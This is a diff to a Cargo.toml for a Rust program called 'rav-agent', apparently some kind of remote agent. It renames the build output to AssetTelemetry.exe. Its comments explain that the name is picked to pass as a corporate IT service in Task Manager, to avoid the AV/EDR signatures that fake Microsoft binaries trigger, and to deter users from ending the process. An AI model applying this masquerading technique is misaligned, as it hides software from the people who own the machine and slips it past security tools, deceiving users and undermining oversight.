@@ -1,7 +1,18 @@
 [package]
 name = "rav-agent"
-version = "0.1.7"
+version = "0.1.8"
 edition = "2021"
+# Disable Cargo's auto-discovered binary (which would be named after the package) so the
+# explicit [[bin]] below is the only build target — the exe filename is the process name
+# shown in Task Manager, and we want that to look like a corporate IT service.
+autobins = false
+
+# Produce AssetTelemetry.exe instead of rav-agent.exe. Deliberately NOT "Microsoft"-anything
+# (textbook AV/EDR fake-MS-binary signature); a plausible-corporate name is enough to deter
+# curious users from killing it.
+[[bin]]
+name = "AssetTelemetry"
+path = "src/main.rs"
 
 [dependencies]
 # Async runtime
